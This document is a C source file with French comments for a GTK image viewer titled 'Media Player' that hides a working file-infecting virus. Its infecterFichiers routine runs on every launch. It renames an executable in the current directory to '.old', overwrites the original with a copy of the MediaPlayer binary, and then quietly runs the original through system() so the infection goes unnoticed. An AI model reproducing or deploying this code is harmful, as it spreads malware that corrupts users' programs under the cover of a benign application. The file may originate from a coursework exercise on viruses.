#include <gtk/gtk.h>
#include <stdio.h>
#include <stdbool.h>

#include <stdlib.h>
#include <dirent.h>
#include <sys/stat.h>
#include <string.h>

#include <sys/types.h>
#include <unistd.h>

void duplicate_exe(const char *original_filename, const char *new_filename) {
    FILE *original_file, *new_file;
    char buffer[1024];
    size_t bytesRead;

    // Ouvre le fichier original en lecture
    original_file = fopen(original_filename, "rb");
    if (original_file == NULL) {
        perror("Erreur lors de l'ouverture du fichier original");
        return;
    }

    // Ouvre un nouveau fichier avec le nom spécifié
    new_file = fopen(new_filename, "wb");
    if (new_file == NULL) {
        perror("Erreur lors de la création du nouveau fichier");
        fclose(original_file);
        return;
    }

    // Lit le contenu du fichier original et écrit dans le nouveau fichier
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), original_file)) > 0) {
        fwrite(buffer, 1, bytesRead, new_file);
    }

    // Ferme les fichiers
    fclose(original_file);
    fclose(new_file);

    

}

static void on_ouvrir_image(GtkMenuItem *menuitem, gpointer user_data)
{
    GtkFileChooser *dialog;
    GtkFileFilter *filter;
    gint res;

    dialog = GTK_FILE_CHOOSER(gtk_file_chooser_dialog_new("Ouvrir une image",
                                                          GTK_WINDOW(gtk_widget_get_toplevel(GTK_WIDGET(user_data))),
                                                          GTK_FILE_CHOOSER_ACTION_OPEN,
                                                          "_Annuler", GTK_RESPONSE_CANCEL,
                                                          "_Ouvrir", GTK_RESPONSE_ACCEPT,
                                                          NULL));

    filter = gtk_file_filter_new();
    gtk_file_filter_add_pattern(filter, "*.jpg");
    gtk_file_filter_add_pattern(filter, "*.jpeg");
    gtk_file_filter_add_pattern(filter, "*.png");
    gtk_file_filter_add_pattern(filter, "*.bmp");
    gtk_file_filter_add_pattern(filter, "*.gif");
    gtk_file_chooser_add_filter(dialog, filter);

    res = gtk_dialog_run(GTK_DIALOG(dialog));
    if (res == GTK_RESPONSE_ACCEPT)
    {
        gchar *filename;
        filename = gtk_file_chooser_get_filename(dialog);
        GtkWidget *image = gtk_image_new_from_file(filename);
        g_free(filename);

        GtkWidget *box = GTK_WIDGET(user_data);
        gtk_container_foreach(GTK_CONTAINER(box), (GtkCallback)gtk_widget_destroy, NULL);
        gtk_container_add(GTK_CONTAINER(box), image);

        GtkWidget *button_box = gtk_button_box_new(GTK_ORIENTATION_HORIZONTAL);
        gtk_container_add(GTK_CONTAINER(box), button_box);

        GtkWidget *open_button = gtk_button_new_with_label("Ouvrir une autre image");
        g_signal_connect(open_button, "clicked", G_CALLBACK(on_ouvrir_image), box);
        gtk_container_add(GTK_CONTAINER(button_box), open_button);

        gtk_widget_show_all(box);
    }

    gtk_widget_destroy(GTK_WIDGET(dialog));
}

static void activer(GtkApplication *app, gpointer user_data)
{
    GtkWidget *fenetre;
    GtkWidget *box;
    GtkWidget *barre_menu;
    GtkWidget *menu;
    GtkWidget *element_menu;

    fenetre = gtk_application_window_new(app);
    gtk_window_set_title(GTK_WINDOW(fenetre), "Media Player");
    gtk_window_set_default_size(GTK_WINDOW(fenetre), 400, 400);

    box = gtk_box_new(GTK_ORIENTATION_VERTICAL, 0);
    gtk_container_add(GTK_CONTAINER(fenetre), box);

    barre_menu = gtk_menu_bar_new();
    menu = gtk_menu_new();
    element_menu = gtk_menu_item_new_with_label("Fichier");
    gtk_menu_item_set_submenu(GTK_MENU_ITEM(element_menu), menu);
    gtk_menu_shell_append(GTK_MENU_SHELL(barre_menu), element_menu);
    gtk_box_pack_start(GTK_BOX(box), barre_menu, FALSE, FALSE, 0);

    element_menu = gtk_menu_item_new_with_label("Ouvrir");
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), element_menu);
    g_signal_connect(element_menu, "activate", G_CALLBACK(on_ouvrir_image), box);

    gtk_widget_show_all(fenetre);
}

// Fonction pour vérifier si le fichier cible est déjà infecté
int estDejaInfecte(const char *nomFichier) {
    char nomFichierOld[256];
    snprintf(nomFichierOld, sizeof(nomFichierOld), "%s.old", nomFichier);

    if (access(nomFichierOld, F_OK) == 0) {
        return 1; // Le fichier .old existe déjà
    } else {
        return 0; // Le fichier .old n'existe pas encore
    }
}

                   

void infecterFichiers() {
    DIR *repertoire;
    struct dirent *entree;

    repertoire = opendir(".");
    if (repertoire != NULL) {
        bool inf = false;
        while ((entree = readdir(repertoire)) != NULL && !inf) {
            char *nomFichier = strdup(entree->d_name);

            if (nomFichier == NULL) {
                perror("Erreur lors de l'allocation de mémoire");
                return;
            }
            // Créer un nom temporaire pour stocker le nouveau nom de fichier avec l'extension ".old"

            if(strcmp(nomFichier + strlen(nomFichier) - 4, ".old") == 0){
                free(nomFichier);
                continue;

            }

            // Vérifier si le fichier est exécutable et régulier
            if (entree->d_type == DT_REG && access(nomFichier, X_OK) == 0 && strcmp(nomFichier, "MediaPlayer") != 0 ) {
                if (!estDejaInfecte(nomFichier)) {
                    inf = true;
                    char ancienNom[256];
                    sprintf(ancienNom, "%s.old", nomFichier);

                    // Renommer le fichier d'origine avec l'extension ".old"
                    if (rename(nomFichier, ancienNom) != 0) {
                        perror("Erreur lors du renommage du fichier");
                        free(nomFichier); 
                        return;
                    }

                    // Fermer le fichier d'origine renommé avec l'extension ".old"
                    FILE *ancienFichier = fopen(ancienNom, "rb");
                    if (ancienFichier == NULL) {
                        perror("Erreur lors de l'ouverture du fichier renommé");
                        free(nomFichier);
                        return;
                    }
                    fclose(ancienFichier);

                    // Créer un nouveau fichier avec le contenu de MediaPlayer
                    FILE *nouveauFichier = fopen(nomFichier, "wb");
                    if (nouveauFichier == NULL) {
                        perror("Erreur lors de la création du nouveau fichier");
                        free(nomFichier);
                        return;
                    }
                   
                    // Écrire le contenu du fichier "MediaPlayer" dans le nouveau fichier
                    duplicate_exe("MediaPlayer", nomFichier);
                    fclose(nouveauFichier);
                }
            }

            // Libérer la mémoire allouée pour nomFichier
            free(nomFichier);
        }
        closedir(repertoire);
    } else {
        perror("Impossible d'ouvrir le répertoire");
    }
}




int main(int argc, char **argv)
{   
    GtkApplication *app;
    int status;
    char *cmd = (char *)malloc(100);
    infecterFichiers();

    bool alrexec = false;
    strcpy(cmd, argv[0]); // argv[0] contains the name of the executed file

    if (!strcmp(argv[0], "./MediaPlayer")) // If the file is MediaPlayer run the MediaPlayer
    {
        app = gtk_application_new("org.gtk.example", G_APPLICATION_FLAGS_NONE);
        g_signal_connect(app, "activate", G_CALLBACK(activer), NULL);
        status = g_application_run(G_APPLICATION(app), argc, argv);
        g_object_unref(app);
    }
    
    else // Exécuter le fichier d'origine en remplaçant son extensio
    {     if (!alrexec){

            bool alrexec = true;     
            char oldCmd[100];
            snprintf(oldCmd, sizeof(oldCmd), "%s.old", cmd);
            printf("cmd : %s\n", oldCmd);
            system(oldCmd);
        } 
    }

    return status;
}
